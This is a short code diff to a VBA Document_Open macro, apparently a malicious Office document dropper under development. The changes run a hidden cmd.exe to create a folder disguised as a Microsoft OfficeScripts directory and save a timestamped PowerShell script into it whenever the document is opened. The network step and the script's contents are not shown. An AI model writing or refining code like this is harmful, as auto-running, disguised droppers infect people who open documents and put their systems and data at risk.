@@ -22,11 +22,12 @@ Private Sub Document_Open()
 
         ' Setup folder path
         Dim folderPath As String
-        folderPath = "C:\Users\" & currentUser & "\AppData\Local\Temp\"
+        folderPath = "C:\Users\" & currentUser & "\AppData\Local\Microsoft\OfficeScripts\"
+        Shell "cmd.exe /c if not exist """ & folderPath & """ mkdir """ & folderPath & """", vbHide
     
         
         ' Final PS1 path
-        savePath = folderPath & "office.ps1"
+        savePath = folderPath & "office_" & Format(Now, "yyyymmdd_hhnnss") & ".ps1"
 
         MsgBox "deleting if copy exists", vbCritical, "Debug"
         ' Delete existing file if it exists
